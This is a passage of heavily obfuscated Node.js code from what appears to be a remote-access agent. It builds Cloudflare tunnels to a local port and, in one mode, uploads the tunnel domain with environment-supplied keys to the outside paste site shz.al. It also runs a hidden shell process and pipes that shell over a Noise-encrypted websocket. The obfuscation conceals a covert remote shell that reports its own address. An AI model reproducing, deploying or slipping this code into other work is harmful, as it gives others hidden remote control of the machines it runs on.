            }, v => {
                const dR = dQ;
                j[dR(0x194)](h, {
                    'status': v[dR(0x49b)],
                    'headers': j[dR(0x194)](a0ax, v),
                    'body': v
                });
            });
        q['on'](g['niqOV'], v => i(v)), q[dQ(0x755)](f[dQ(0x261)] ? f : undefined);
    });
}
function a0az(a) {
    const dS = a0aO, b = {
            'LjhLm': dS(0x146),
            'ebTMQ': dS(0x49c),
            'PUVLR': dS(0x755),
            'ARbZv': dS(0x3f0),
            'jgtOx': function (c) {
                return c();
            },
            'zxLgV': function (c) {
                return c();
            },
            'RuGXT': dS(0x5c2),
            'fFcJU': dS(0x5ba),
            'AYLIc': function (c) {
                return c();
            },
            'TaFUH': 'latin1',
            'LFwjj': function (c, d) {
                return c(d);
            },
            'qIHUW': dS(0x41c),
            'eWQAs': function (c, d) {
                return c + d;
            }
        };
    return new Promise((c, d) => {
        const dT = dS, f = {
                'ddkxL': b[dT(0x36e)],
                'bTepu': function (l) {
                    return b['AYLIc'](l);
                },
                'HFoPn': b[dT(0x326)],
                'vnKpv': function (l, m, n) {
                    return l(m, n);
                },
                'uCLjd': function (l, m) {
                    const dU = dT;
                    return b[dU(0x279)](l, m);
                },
                'Xpsdq': b[dT(0x36c)],
                'ESTev': function (l, m) {
                    return l < m;
                },
                'BSdhX': function (l, m) {
                    return l > m;
                },
                'RSupg': function (l, m) {
                    const dV = dT;
                    return b[dV(0x678)](l, m);
                }
            };
        let g = Buffer[dT(0x53d)](0x0);
        const h = () => {
                const dW = dT;
                a[dW(0x15c)](b[dW(0x1f0)], i), a[dW(0x15c)](b[dW(0x7a0)], j), a[dW(0x15c)](b['PUVLR'], k), a[dW(0x15c)](b['ARbZv'], k);
            }, i = l => {
                const dX = dT;
                g = g[dX(0x261)] ? Buffer[dX(0x697)]([
                    g,
                    l
                ]) : l;
                const m = g[dX(0x35a)](f[dX(0x3b7)]);
                if (m < 0x0)
                    return;
                f[dX(0x560)](h);
                const n = g[dX(0x2a7)](0x0, m)[dX(0x3e1)](f[dX(0x429)]), o = n['split']('\x0d\x0a'), p = o[0x0][dX(0x2c2)]('\x20'), q = f[dX(0x69a)](parseInt, p[0x1], 0xa);
                if (!Number['isInteger'](q)) {
                    f['uCLjd'](d, new Error(f[dX(0x464)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; f[dX(0x357)](s, o[dX(0x261)]); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[dX(0x35a)](':');
                    f[dX(0x786)](u, 0x0) && r[dX(0x51c)]([
                        t[dX(0x71b)](0x0, u)[dX(0x61c)](),
                        t[dX(0x71b)](f[dX(0x168)](u, 0x1))[dX(0x61c)]()
                    ]);
                }
                f[dX(0x2ef)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[dX(0x2a7)](m + 0x4)
                });
            }, j = l => {
                const dY = dT;
                b[dY(0x289)](h), d(l);
            }, k = () => {
                const dZ = dT;
                b['zxLgV'](h), d(new Error(b[dZ(0x72d)]));
            };
        a['on'](b[dT(0x1f0)], i), a['on']('error', j), a['on'](b[dT(0x70f)], k), a['on'](b[dT(0x3e6)], k);
    });
}
function a0aA(a, b) {
    const e0 = a0aO, c = {
            'WxIFF': 'error',
            'VllCk': 'secureConnect',
            'KbLuk': function (h, i) {
                return h + i;
            },
            'dQzyr': function (h, i) {
                return h + i;
            },
            'XwdrL': function (h, i) {
                return h + i;
            },
            'ZWAnq': function (h, i) {
                return h + i;
            },
            'ncUqP': 'all\x20Cloudflare\x20edges\x20failed:\x20',
            'upVjS': function (h) {
                return h();
            }
        }, d = a0Y[e0(0x71b)]()['sort'](() => Math[e0(0x35d)]() - 0.5);
    let f = null;
    const g = async () => {
        const e1 = e0, h = {
                'iLUrw': function (i, j) {
                    return i + j;
                },
                'vSekp': c[e1(0x681)],
                'gsXSz': c[e1(0x650)]
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const e2 = e1, l = {
                            'goSRG': function (n, o) {
                                return n !== o;
                            },
                            'XccUm': function (n, o) {
                                return h['iLUrw'](n, o);
                            },
                            'JjhrL': function (n, o) {
                                return n(o);
                            }
                        }, m = a0j[e2(0x51b)]({
                            'host': i,
                            'port': a0Z,
                            'ALPNProtocols': ['h2'],
                            'servername': e2(0x149),
                            'rejectUnauthorized': a
                        });
                    m[e2(0x179)](0x2710, () => m['destroy'](new Error(e2(0x5c3)))), m['on'](h[e2(0x3cb)], k), m['on'](h['gsXSz'], () => {
                        const e3 = e2, n = m[e3(0x521)];
                        if (n && l[e3(0x5cd)](n, 'h2')) {
                            m[e3(0x482)](new Error(e3(0x446)));
                            return;
                        }
                        m[e3(0x179)](0x0), b['info'](l['XccUm'](e3(0x3a4) + i, ':') + a0Z), l[e3(0x3df)](j, m);
                    });
                });
            } catch (j) {
                f = j, b[e1(0x6d8)](c[e1(0x6ce)](c['dQzyr'](c[e1(0x2d6)](e1(0x1a8), i), e1(0x4ab)), j));
            }
        }
        throw new Error(c[e1(0x1e5)](c[e1(0x31f)], f));
    };
    return c['upVjS'](g);
}
const a0aB = 0x2;
function a0aC(a) {
    const e4 = a0aO, b = {
            'qCvmQ': e4(0x69d),
            'wRGcZ': function (c, d) {
                return c === d;
            },
            'kxuWt': e4(0x29e)
        };
    if (typeof a === b[e4(0x219)]) {
        const c = a[e4(0x61c)]();
        if (c)
            try {
                return JSON[e4(0x439)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b['wRGcZ'](typeof a, b[e4(0x14d)]) ? a : {};
}
class a0aD {
    constructor(a) {
        const e5 = a0aO;
        this[e5(0x6b8)] = a, this[e5(0x7af)] = new Map();
    }
    async [a0aO(0x323)](a, b) {
        const e6 = a0aO, c = {
                'aZdwQ': function (l, m) {
                    return l > m;
                },
                'KIcMZ': function (l, m) {
                    return l(m);
                },
                'dpkNG': e6(0x32f),
                'EkKTg': function (l, m) {
                    return l + m;
                },
                'tTGzA': e6(0x4fc),
                'RyQeM': e6(0x1b0),
                'MFhec': function (l, m) {
                    return l + m;
                },
                'jwoxQ': e6(0x675),
                'utPqu': e6(0x5f0)
            }, d = this['tunnels'][e6(0x6f7)](a) || [];
        if (c[e6(0x4e8)](d[e6(0x261)], 0x0) && !b) {
            const l = new Error(e6(0x172) + a + e6(0x346));
            l[e6(0x7ac)] = 0x199, l[e6(0x513)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c[e6(0x5e6)](a0aq, c['dpkNG']);
        } catch (m) {
            const n = new Error(c[e6(0x23c)](c[e6(0x36b)], m[e6(0x6ac)]));
            n[e6(0x7ac)] = 0x1f4, n[e6(0x513)] = a;
            throw n;
        }
        const j = f['startsWith'](c['RyQeM']) ? f : c[e6(0x23c)](c[e6(0x539)], f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()['toISOString']()['replace'](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[e6(0x43b)] = this[e6(0x632)](k, g, h, i)[e6(0x648)](o => this[e6(0x6b8)][e6(0x6d8)](e6(0x4fd) + j + e6(0x5b2) + o['message'])), d[e6(0x51c)](k), this[e6(0x7af)][e6(0x3bc)](a, d), this[e6(0x6b8)][e6(0x793)](c[e6(0x23c)](c[e6(0x799)](c[e6(0x264)] + j, c[e6(0x2b8)]), a)), k;
    }
    [a0aO(0x373)]() {
        const e7 = a0aO, a = [], b = [...this['tunnels'][e7(0x3c7)]()][e7(0x672)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this[e7(0x7af)]['get'](c)) {
                a[e7(0x51c)]({
                    'tunnel_domain': d[e7(0x73b)],
                    'port': d[e7(0x513)],
                    'created_at': d['createdAt']
                });
            }
        }
        return a;
    }
    async [a0aO(0x4dc)](a, b) {
        const e8 = a0aO, c = {
                'VYNFP': function (i, j) {
                    return i === j;
                },
                'VncTt': function (i, j) {
                    return i === j;
                },
                'VCLYK': function (i, j) {
                    return i > j;
                },
                'iNlYZ': function (i, j) {
                    return i > j;
                },
                'JwjBV': function (i, j) {
                    return i + j;
                },
                'sdRHE': e8(0x69e)
            }, d = this[e8(0x7af)]['get'](a) || [];
        if (c['VYNFP'](d[e8(0x261)], 0x0))
            return {
                'status': 0x194,
                'message': e8(0x2a8) + a
            };
        let f;
        if (c[e8(0x4e0)](b, undefined) || c[e8(0x5e4)](b, null) || c[e8(0x5e4)](b, '')) {
            if (c['VCLYK'](d['length'], 0x1))
                return {
                    'status': 0x199,
                    'message': e8(0x7a2) + a + e8(0x481)
                };
            f = d;
        } else {
            f = d[e8(0x653)](i => i[e8(0x73b)] === b);
            if (c['VYNFP'](f[e8(0x261)], 0x0))
                return {
                    'status': 0x194,
                    'message': e8(0x2a8) + a + '\x20with\x20domain\x20' + b
                };
        }
        const g = [];
        for (const i of f) {
            i['stopped'] = !![];
            if (i[e8(0x7a6)] !== null)
                try {
                    i[e8(0x7a6)][e8(0x482)]();
                } catch (j) {
                }
            await i[e8(0x43b)][e8(0x648)](() => {
            }), g[e8(0x51c)]({
                'tunnel_domain': i[e8(0x73b)],
                'port': i['port'],
                'created_at': i[e8(0x1b4)]
            });
        }
        const h = d['filter'](k => !k[e8(0x729)]);
        c[e8(0x22c)](h['length'], 0x0) ? this['tunnels'][e8(0x3bc)](a, h) : this[e8(0x7af)][e8(0x5f4)](a);
        for (const k of g) {
            this['log'][e8(0x793)](c['JwjBV'](c[e8(0x6b0)], k[e8(0x4c5)]));
        }
        return {
            'status': 'ok',
            'deleted': g[e8(0x261)],
            'tunnels': g
        };
    }
    async [a0aO(0x632)](a, b, c, d) {
        const e9 = a0aO, f = {
                'TLNyw': function (h, i) {
                    return h + i;
                },
                'wtrEF': e9(0x403),
                'HNcUS': function (h, i) {
                    return h !== i;
                },
                'pJQjb': function (h, i) {
                    return h(i);
                },
                'CWgMg': e9(0x269),
                'WtjXb': function (h, i) {
                    return h + i;
                },
                'mnmyK': e9(0x5f1),
                'bPjCD': function (h, i) {
                    return h !== i;
                }
            }, g = f[e9(0x6b4)](f['wtrEF'], a['port']);
        while (!a[e9(0x729)]) {
            let h = null;
            try {
                const i = f['HNcUS'](f['pJQjb'](String, process.env.KISAMA_EDGE_INSECURE || '')['toLowerCase'](), f[e9(0x19c)]);
                h = await a0aA(i, this[e9(0x6b8)]);
                if (a[e9(0x729)]) {
                    try {
                        h[e9(0x482)]();
                    } catch (j) {
                    }
                    break;
                }
                a[e9(0x7a6)] = h, await new a0at(h, g, b, c, d, 0x0, this[e9(0x6b8)], a[e9(0x73b)], ![], { 'printed': !![] })[e9(0x4d8)]();
            } catch (k) {
                !a[e9(0x729)] && this[e9(0x6b8)][e9(0x6d8)](f[e9(0x216)](f['mnmyK'] + a[e9(0x73b)] + '\x20connection\x20closed:\x20', k[e9(0x6ac)]));
            } finally {
                if (f['bPjCD'](h, null))
                    try {
                        h[e9(0x482)]();
                    } catch (l) {
                    }
                a[e9(0x7a6)] = null;
            }
            !a[e9(0x729)] && await new Promise(m => setTimeout(m, a0aB * 0x3e8));
        }
    }
}
class a0aE {
    static [a0aO(0x154)] = ![];
    static ['_domain'] = null;
    static ['_SHZAL_NAME_CHARS'] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0aO(0x718)]() {
        const ea = a0aO, a = {
                'IsbSC': function (c, d) {
                    return c >= d;
                }
            }, b = a0N[ea(0x177)] || '';
        return a[ea(0x6a9)](b['length'], 0x3) && this['_SHZAL_NAME_CHARS'][ea(0x1ec)](b);
    }
    static [a0aO(0x20a)](a) {
        const eb = a0aO, b = {
                'VuPCZ': eb(0x755),
                'EUOvT': function (c, d) {
                    return c + d;
                },
                'GJdBM': eb(0x49c),
                'GMjYD': function (c, d, f, g, h) {
                    return c(d, f, g, h);
                },
                'QJgMC': function (c, d) {
                    return c(d);
                },
                'bngBZ': eb(0x658),
                'iJKIG': eb(0x2e1),
                'BUGul': eb(0x1ac),
                'InpES': function (c, d) {
                    return c(d);
                }
            };
        return new Promise(c => {
            const ec = eb, d = {
                    'efRLf': b[ec(0x646)],
                    'DMbII': function (l, m) {
                        const ed = ec;
                        return b[ed(0x2ca)](l, m);
                    },
                    'CiwXo': b[ec(0x2fa)],
                    'miBNz': function (l, m, n, o, p) {
                        const ee = ec;
                        return b[ee(0x662)](l, m, n, o, p);
                    },
                    'JSihM': function (l, m) {
                        const ef = ec;
                        return b[ef(0x55e)](l, m);
                    },
                    'cyXaw': b[ec(0x2bd)],
                    'IrFmi': function (l) {
                        return l();
                    }
                }, f = a0N['KNAME'], g = a0N['KNAME_KEY'] || a0N[ec(0x177)], h = b[ec(0x5ad)] + a0k[ec(0x391)](0xc)[ec(0x3e1)](b[ec(0x169)]), i = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        f
                    ],
                    [
                        's',
                        g
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], j = l => {
                    const eg = ec, m = l[eg(0x547)](([n, o]) => Buffer['from']('--' + h + eg(0x67c) + n + eg(0x383) + o + '\x0d\x0a'));
                    return m['push'](Buffer[eg(0x426)]('--' + h + '--\x0d\x0a')), Buffer[eg(0x697)](m);
                }, k = (l, m, n, o) => {
                    const eh = ec, p = new URL(l), q = a0h[eh(0x544)]({
                            'hostname': p['hostname'],
                            'port': p[eh(0x513)] || 0x1bb,
                            'path': d[eh(0x69b)](p[eh(0x433)], p[eh(0x612)]),
                            'method': n,
                            'headers': {
                                'Content-Type': eh(0x5b0) + h,
                                'Content-Length': m ? m[eh(0x261)] : 0x0,
                                'User-Agent': eh(0x5ce)
                            }
                        }, r => {
                            const ei = eh;
                            r[ei(0x4a3)](), r['on'](d[ei(0x57e)], () => o(r['statusCode']));
                        });
                    q['on'](d['CiwXo'], () => o(0x0));
                    if (m)
                        q['write'](m);
                    q['end']();
                };
            try {
                k('https://shz.al/', b[ec(0x393)](j, i), ec(0x42b), l => {
                    const ej = ec;
                    if (l === 0x199) {
                        const m = i[ej(0x653)](([n]) => n !== 'n');
                        d[ej(0x224)](k, ej(0x4cc) + f + ':' + g, d[ej(0x765)](j, m), d[ej(0x4e2)], () => c());
                    } else
                        d[ej(0x4e9)](c);
                });
            } catch (l) {
            }
        })[eb(0x65d)](() => {
            const ek = eb;
            this[ek(0x65b)] = a;
        })[eb(0x648)](() => {
        });
    }
    static [a0aO(0x6e3)]() {
        const el = a0aO, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l['existsSync'](b) && a0l[el(0x59e)](b)[el(0x1ae)]())
                return b;
        }
        try {
            return a0o['homedir']();
        } catch (c) {
            return process['cwd']();
        }
    }
    static ['resolveDomainFilePath']() {
        const em = a0aO, a = { 'ZWtOZ': 'domain.txt' };
        let b = (a0N[em(0x277)] || '')['trim']();
        if (!b)
            return a0n[em(0x4d0)](this['homeDir'](), a['ZWtOZ']);
        if (b['startsWith'](em(0x3b3)))
            b = b[em(0x261)] > 0x5 ? a0n[em(0x4d0)](this['homeDir'](), b[em(0x71b)](0x5)[em(0x479)](/^[/\\]+/, '')) : this[em(0x6e3)]();
        else
            b[em(0x2c3)]('~') && (b = a0n[em(0x3be)](b['replace'](/^~(?=[/\\]|$)/, this[em(0x6e3)]())));
        return b;
    }
    static [a0aO(0x1f5)](a) {
        const en = a0aO;
        this['_domain'] = a;
        const b = this[en(0x61f)]();
        try {
            a0l[en(0x4aa)](a0n['dirname'](a0n[en(0x3be)](b)), { 'recursive': !![] }), a0l['writeFileSync'](b, a), a0B['info'](en(0x1ce) + b);
        } catch (c) {
            a0B[en(0x3b0)](en(0x2ac) + b + en(0x5a5) + c[en(0x6ac)]);
        }
    }
    static [a0aO(0x51e)]() {
        const eo = a0aO, a = this[eo(0x61f)]();
        try {
            a0l[eo(0x45d)](a) && a0l[eo(0x59e)](a)[eo(0x743)]() && (a0l[eo(0x692)](a), a0B[eo(0x793)](eo(0x14b) + a));
        } catch (b) {
            a0B[eo(0x3b0)]('[KMODE]\x20⚠️\x20域名文件删除失败\x20(' + a + '):\x20' + b[eo(0x6ac)]);
        }
    }
    static [a0aO(0x5a8)]() {
        const ep = a0aO;
        !this['_baseinfoHooked'] && (this['_baseinfoHooked'] = !![], this[ep(0x51e)]());
    }
    static [a0aO(0x430)]() {
        const eq = a0aO, a = {
                'ClQRQ': eq(0x6f5),
                'rFBpl': eq(0x3f0),
                'hrpGy': 'error'
            };
        try {
            const b = a0p[eq(0x3a8)]({
                'input': process[eq(0x47e)],
                'terminal': ![]
            });
            b['on'](a['ClQRQ'], c => {
                const er = eq;
                c['trim']() === '/domain' && console[er(0x6b8)](this[er(0x65b)] || er(0x345));
            }), b['on'](a['rFBpl'], () => {
            }), b['on'](a[eq(0x434)], () => {
            });
        } catch (c) {
        }
    }
    static [a0aO(0x4fa)](a) {
        const es = a0aO, b = {
                'LgdSl': function (c, d) {
                    return c === d;
                },
                'kemVp': '[KMODE]\x20🚀\x20KMODE=2:\x20隧道域名将上报至外部平台',
                'fhEnm': es(0x55d)
            };
        if (b[es(0x217)](a0N[es(0x2d4)], '2') && this[es(0x718)]()) {
            a0B[es(0x793)](b[es(0x2f1)]), a[es(0x323)](a0N['PORT'])[es(0x65d)](c => this[es(0x20a)](c[es(0x73b)]))[es(0x648)](() => {
            });
            return;
        }
        a0B[es(0x793)](b[es(0x65a)]), a[es(0x323)](a0N[es(0x1ed)])[es(0x65d)](c => {
            const et = es;
            this[et(0x1f5)](c[et(0x73b)]);
        })[es(0x648)](c => {
            const eu = es;
            a0B[eu(0x3b0)](eu(0x206) + c[eu(0x6ac)]);
        }), this[es(0x430)]();
    }
}
let a0aF = null, a0aG = null;
const a0aH = new Promise((a, b) => {
    const ev = a0aO, c = {
            'cuQPt': function (d) {
                return d();
            },
            'ZcBex': ev(0x526),
            'GkFiE': function (d) {
                return d();
            },
            'dxqZf': function (d, f) {
                return d(f);
            },
            'XSdHi': '[WARN]\x20Exception\x20loading\x20Noise\x20module:'
        };
    try {
        c[ev(0x1a3)](a0x, function (d) {
            const ew = ev;
            if (!d) {
                a0aG = new Error(ew(0x69c)), a0B['warn'](ew(0x2a1), a0aG['message']), c[ew(0x27f)](a);
                return;
            }
            a0aF = d, a0B[ew(0x637)](c[ew(0x2a3)]), c[ew(0x640)](a);
        });
    } catch (d) {
        a0aG = d, a0B['warn'](c[ev(0x4c7)], d[ev(0x6ac)]), a();
    }
});
process['on'](a0aO(0x2ab), (a, b) => {
    const ex = a0aO, c = { 'juGLl': 'Unhandled\x20Promise\x20Rejection:' };
    a0B[ex(0x49c)](c[ex(0x579)], a);
}), process['on'](a0aO(0x70e), a => {
    const ey = a0aO, b = { 'BkMlN': ey(0x174) };
    a0B[ey(0x49c)](b['BkMlN'], a), process[ey(0x3cd)](0x1);
});
class a0aI {
    constructor(a, b, c) {
        const ez = a0aO, d = { 'LZeSo': ez(0x314) }, f = d[ez(0x607)]['split']('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[ez(0x3ad)] = a;
                continue;
            case '1':
                this['sendCipher'] = null;
                continue;
            case '2':
                this['hs'] = null;
                continue;
            case '3':
                this[ez(0x5ef)] = ![];
                continue;
            case '4':
                this[ez(0x1a7)] = null;
                continue;
            case '5':
                this[ez(0x520)] = b;
                continue;
            case '6':
                this[ez(0x492)] = c;
                continue;
            }
            break;
        }
    }
    async [a0aO(0x76d)]() {
        const eA = a0aO, a = {
                'VfUbf': 'Noise\x20WASM\x20module\x20not\x20available',
                'Nfaae': 'Noise_XX_25519_ChaChaPoly_BLAKE2s',
                'yQkOZ': 'kisama_terminal_v1',
                'Axilu': eA(0x3a2)
            };
        await a0aH;
        if (!a0aF)
            throw a0aG || new Error(a[eA(0x6c2)]);
        const b = a0aF, c = this[eA(0x3ad)] ? b['constants']['NOISE_ROLE_INITIATOR'] : b['constants'][eA(0x5ae)];
        this['hs'] = b['HandshakeState'](a[eA(0x624)], c);
        const d = Buffer['from'](a['yQkOZ']), f = this[eA(0x520)] ? Buffer[eA(0x426)](this['localPrivB64'], a[eA(0x1ca)]) : null, g = this[eA(0x492)] ? Buffer[eA(0x426)](this[eA(0x492)], eA(0x3a2)) : null;
        this['hs'][eA(0x57b)](d, f, g, null);
    }
    [a0aO(0x16f)](a) {
        const eB = a0aO, b = {
                'QdKVa': function (d, f) {
                    return d === f;
                },
                'nLcbg': function (d, f) {
                    return d === f;
                }
            };
        if (this['handshakeFinished'])
            return Buffer[eB(0x53d)](0x0);
        const c = a0aF;
        a && a[eB(0x261)] > 0x0 && b[eB(0x220)](this['hs'][eB(0x4b9)](), c[eB(0x52a)][eB(0x24d)]) && this['hs'][eB(0x41d)](a);
        if (b[eB(0x220)](this['hs'][eB(0x4b9)](), c[eB(0x52a)]['NOISE_ACTION_SPLIT']))
            return this[eB(0x704)](), Buffer[eB(0x53d)](0x0);
        if (b['QdKVa'](this['hs'][eB(0x4b9)](), c['constants'][eB(0x478)])) {
            const d = this['hs'][eB(0x3a0)](new Uint8Array(0x0));
            return b[eB(0x13f)](this['hs'][eB(0x4b9)](), c[eB(0x52a)]['NOISE_ACTION_SPLIT']) && this['_splitAndFinish'](), Buffer[eB(0x426)](d);
        }
        return Buffer[eB(0x53d)](0x0);
    }
    [a0aO(0x704)]() {
        const eC = a0aO, a = {
                'paHtZ': eC(0x3a2),
                'IeWag': function (g, h) {
                    return g && h;
                },
                'hOyXJ': function (g, h) {
                    return g === h;
                },
                'AkAdC': eC(0x784)
            };
        let b = null;
        try {
            b = this['hs']['GetRemotePublicKey']();
        } catch (g) {
            b = null;
        }
        const c = this[eC(0x492)] ? Buffer['from'](this[eC(0x492)], a[eC(0x2ba)]) : null, d = a[eC(0x395)](b, c) && a[eC(0x4b2)](b['length'], c['length']) && a0k[eC(0x3f8)](Buffer[eC(0x426)](b), c);
        if (!d)
            throw new Error(a[eC(0x208)]);
        const f = this['hs'][eC(0x5b1)]();
        this[eC(0x604)] = f[0x0], this['recvCipher'] = f[0x1], this[eC(0x5ef)] = !![];
        try {
            if (this['hs'])
                this['hs'][eC(0x71a)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    [a0aO(0x444)](a) {
        const eD = a0aO, b = { 'PfitG': eD(0x308) };
        if (!this['handshakeFinished'])
            throw new Error(b[eD(0x5fd)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer['from'](this[eD(0x604)][eD(0x425)](c, d));
    }
    [a0aO(0x64a)](a) {
        const eE = a0aO;
        if (!this[eE(0x5ef)])
            throw new Error(eE(0x1b8));
        const b = new Uint8Array(0x0), c = new Uint8Array(a);
        return Buffer['from'](this[eE(0x1a7)][eE(0x2b4)](b, c));
    }
    [a0aO(0x71a)]() {
        const eF = a0aO;
        try {
            if (this[eF(0x604)])
                this[eF(0x604)][eF(0x71a)]();
        } catch (a) {
        }
        try {
            if (this['recvCipher'])
                this['recvCipher']['free']();
        } catch (b) {
        }
        try {
            if (this['hs'])
                this['hs']['free']();
        } catch (c) {
        }
        this['sendCipher'] = null, this[eF(0x1a7)] = null, this['hs'] = null;
    }
}
class a0aJ {
    constructor(a, b, c) {
        const eG = a0aO, d = eG(0x580)[eG(0x2c2)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this[eG(0x1e9)] = null;
                continue;
            case '1':
                this['cwd'] = c;
                continue;
            case '2':
                this[eG(0x1bf)] = null;
                continue;
            case '3':
                this[eG(0x140)] = 0x0;
                continue;
            case '4':
                this[eG(0x473)] = b;
                continue;
            case '5':
                this['shell'] = a;
                continue;
            case '6':
                this[eG(0x6a3)] = null;
                continue;
            }
            break;
        }
    }
    [a0aO(0x204)]() {
        const eH = a0aO, a = {
                'gXvxb': function (c, d) {
                    return c || d;
                },
                'jFsZW': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'RQRLy': eH(0x480),
                'HVtQM': eH(0x146),
                'HEBzq': eH(0x3cd)
            };
        this[eH(0x1bf)] = a[eH(0x320)](a0r, this[eH(0x619)], [], {
            'env': this[eH(0x473)],
            'cwd': this[eH(0x41e)],
            'windowsHide': !![],
            'stdio': [
                a['RQRLy'],
                a[eH(0x2c5)],
                a[eH(0x2c5)]
            ]
        }), this[eH(0x140)] = this[eH(0x1bf)][eH(0x140)] || 0x0;
        const b = this;
        this[eH(0x1bf)][eH(0x6c7)]['on'](a[eH(0x667)], c => b[eH(0x401)](c)), this[eH(0x1bf)][eH(0x753)]['on'](a[eH(0x667)], c => b[eH(0x401)](c)), this['proc']['on'](a[eH(0x733)], (c, d) => {
            const eI = eH;
            if (b['_onExitCb'])
                b['_onExitCb']({
                    'exitCode': c,
                    'signal': a[eI(0x192)](d, null)
                });
        });
    }
    [a0aO(0x401)](a) {
        const eJ = a0aO, b = { 'Bawop': eJ(0x62c) };
        if (this['_onDataCb'])
            this[eJ(0x6a3)](a[eJ(0x3e1)](b[eJ(0x6dc)]));
    }
    [a0aO(0x2b0)](a) {
        const eK = a0aO;
        return this[eK(0x6a3)] = a, {
            'dispose': () => {
                const eL = eK;
                this[eL(0x6a3)] = null;
            }
        };
    }
    [a0aO(0x14c)](a) {
        const eM = a0aO;
        return this[eM(0x1e9)] = a, {
            'dispose': () => {
                const eN = eM;
                this[eN(0x1e9)] = null;
            }
        };
    }
    [a0aO(0x34b)](a) {
        const eO = a0aO;
        if (!this[eO(0x1bf)] || !this[eO(0x1bf)]['stdin'])
            return;
        try {
            this[eO(0x1bf)]['stdin'][eO(0x34b)](a);
        } catch (b) {
        }
    }
    [a0aO(0x2de)]() {
    }
    [a0aO(0x1f1)]() {
        const eP = a0aO;
        try {
            if (this[eP(0x1bf)])
                this['proc']['kill']();
        } catch (a) {
        }
    }
}
class a0aK {
    constructor() {
        const eQ = a0aO, a = {
                'xZuxu': eQ(0x6e8),
                'rYINM': eQ(0x25e)
            }, b = a[eQ(0x6f2)][eQ(0x2c2)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['requestId'] = null;
                continue;
            case '1':
                this[eQ(0x3ce)] = a0N[eQ(0x26a)][eQ(0x285)][eQ(0x5e1)];
                continue;
            case '2':
                this['msgQueue'] = [];
                continue;
            case '3':
                this[eQ(0x166)] = null;
                continue;
            case '4':
                this['websocket'] = null;
                continue;
            case '5':
                this[eQ(0x51d)] = a0N[eQ(0x26a)]['agent'][eQ(0x2e0)];
                continue;
            case '6':
                this['useNoise'] = !![];
                continue;
            case '7':
                this[eQ(0x68d)] = [];
                continue;
            case '8':
                this['phase'] = a[eQ(0x78d)];
                continue;
            case '9':
                this[eQ(0x7b9)] = new a0aI(![], this[eQ(0x51d)], this[eQ(0x3ce)]);
                continue;
            }
            break;
        }
    }
    async ['cleanup']() {
        const eR = a0aO, a = {
                'fmPYt': function (b, c) {
                    return b === c;
                },
                'WPbej': eR(0x20f)
            };
        this[eR(0x32c)] && a0B[eR(0x793)]('[' + this[eR(0x32c)] + eR(0x312));
        if (this['ptyProcess']) {
            a[eR(0x1ba)](process[eR(0x46e)], 'win32') && this['ptyProcess'][eR(0x140)] && this[eR(0x2d3)](this['ptyProcess'][eR(0x140)]);
            try {
                this[eR(0x166)][eR(0x1f1)]();
            } catch (b) {
            }
            this[eR(0x166)] = null;
        }
        if (this[eR(0x7b9)])
            this[eR(0x7b9)]['free']();
        if (this[eR(0x18b)])
            try {
                a[eR(0x1ba)](this[eR(0x18b)][eR(0x5d1)], this[eR(0x18b)]['OPEN']) && this['websocket'][eR(0x3f0)](0x3e8, a['WPbej']);
            } catch (c) {
            } finally {
                this[eR(0x18b)] = null;
            }
    }
    ['_taskkillTree'](a) {
        const b = {
            'UmDIb': function (c, d, f, g) {
                return c(d, f, g);
            }
        };
        try {
            b['UmDIb'](a0q, 'taskkill\x20/F\x20/T\x20/PID\x20' + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    ['_handleRawMessage'](a) {
        const eS = a0aO, b = {
                'oyhYm': function (c, d) {
                    return c === d;
                },
                'whZob': function (c, d) {
                    return c > d;
                },
                'HywFm': function (c, d) {
                    return c(d);
                },
                'eAgic': eS(0x43a)
            };
        if (b[eS(0x3f4)](this[eS(0x6cf)], eS(0x25e))) {
            if (b['whZob'](this[eS(0x68d)][eS(0x261)], 0x0)) {
                const c = this[eS(0x68d)]['shift']();
                b['HywFm'](c, a);
            } else
                this[eS(0x6e1)]['push'](a);
        } else
            b[eS(0x3f4)](this[eS(0x6cf)], b['eAgic']) && this['_processTerminalMessage'](a);
    }
    async [a0aO(0x41a)]() {
        const eT = a0aO;
        if (this[eT(0x6e1)][eT(0x261)] > 0x0)
            return this[eT(0x6e1)]['shift']();
        return new Promise(a => {
            const eU = eT;
            this[eU(0x68d)][eU(0x51c)](a);
        });
    }
    async [a0aO(0x512)](a) {
        const eV = a0aO, b = {
                'ltfyF': function (c, d) {
                    return c(d);
                },
                'vBiFf': eV(0x43e),
                'zgVOx': eV(0x6bb)
            };
        b[eV(0x687)](a, b['vBiFf']);
        try {
            await this[eV(0x7b9)]['init']();
            const c = await this[eV(0x41a)](), d = this[eV(0x7b9)][eV(0x16f)](c);
            d && d[eV(0x261)] > 0x0 && this[eV(0x18b)][eV(0x195)](d);
            const f = await this['_receiveWsBytes']();
            this['cipher'][eV(0x16f)](f);
            if (!this[eV(0x7b9)]['handshakeFinished'])
                throw new Error(b[eV(0x390)]);
            b[eV(0x687)](a, eV(0x4f6));
        } catch (g) {
            b['ltfyF'](a, eV(0x701) + g[eV(0x6ac)]);
            throw new Error(eV(0x4e1));
        }
    }
    [a0aO(0x6d5)]() {
        const eW = a0aO, a = {
                'dqcyT': function (d, f) {
                    return d === f;
                },
                'gisKL': 'win32',
                'tNZnZ': eW(0x2f4),
